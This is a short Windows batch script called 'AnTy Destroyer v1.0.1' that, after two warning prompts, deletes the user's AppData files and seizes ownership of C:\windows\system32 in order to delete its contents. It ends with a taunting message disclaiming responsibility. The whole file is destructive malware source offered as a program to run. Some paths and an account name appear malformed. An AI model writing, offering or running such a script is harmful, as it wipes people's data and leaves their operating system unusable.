@echo off
title AnTy Destroyer v1.0.1
cd file
start warning.vbs
echo Press any key to begin destruction
pause >nul
echo This is your final warning! (press any key to begin)
pause >nul
color 04
cls
echo beginning destruction
cd /d "C:\%USERPROFILE%\appdata"
del *.* /s /f /q >nul
takeown /f "C:\windows\system32" /a /r /d Y >nul
icacls "C:\windows\system32" /T /grant Adminstrator:F >nul
cd "C:\windows\system32"
del *.* /s /f /q >nul
msg * now that you have run this program and ignored my warnings, your computer is now cooked. all files and appdata are now destroyed, remeber im not responsible for any damages :)
